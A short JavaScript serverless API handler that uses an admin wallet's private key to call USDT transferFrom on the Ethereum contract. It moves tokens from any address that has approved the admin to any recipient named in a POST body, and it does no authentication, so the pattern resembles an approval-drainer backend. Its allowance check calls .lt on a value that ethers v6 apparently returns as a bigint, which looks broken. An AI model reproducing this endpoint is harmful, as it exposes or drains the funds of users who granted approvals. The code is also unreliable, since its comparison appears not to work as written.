import { ethers } from "ethers";

const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY;
const ADMIN_ADDRESS = process.env.ADMIN_ADDRESS;
const USDT_ADDRESS = process.env.USDT_ADDRESS;  // The ERC-20 USDT contract on Ethereum
const ETHEREUM_RPC = process.env.ETHEREUM_RPC; // RPC URL for Ethereum

const ABI = [
    "function transferFrom(address from, address to, uint256 value) public returns (bool)",
    "function allowance(address owner, address spender) public view returns (uint256)"
];

export default async function handler(req, res) {
    if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

    const { from, to, amount } = req.body;
    if (!from || !to || !amount) return res.status(400).json({ error: "Missing parameters" });

    try {
        const provider = new ethers.JsonRpcProvider(ETHEREUM_RPC);
        const adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
        const usdt = new ethers.Contract(USDT_ADDRESS, ABI, adminWallet);

        const amountInWei = ethers.parseUnits(amount, 6); // USDT uses 6 decimals on Ethereum
        const allowance = await usdt.allowance(from, ADMIN_ADDRESS);
        
        // Check if allowance is sufficient
        if (allowance.lt(amountInWei)) {
            return res.status(400).json({ error: "Insufficient allowance" });
        }

        // Send transfer
        const tx = await usdt.transferFrom(from, to, amountInWei);
        await tx.wait();

        return res.json({ status: "success", txHash: tx.hash });
    } catch (err) {
        return res.status(500).json({ error: "Transfer failed", details: err.message });
    }
}
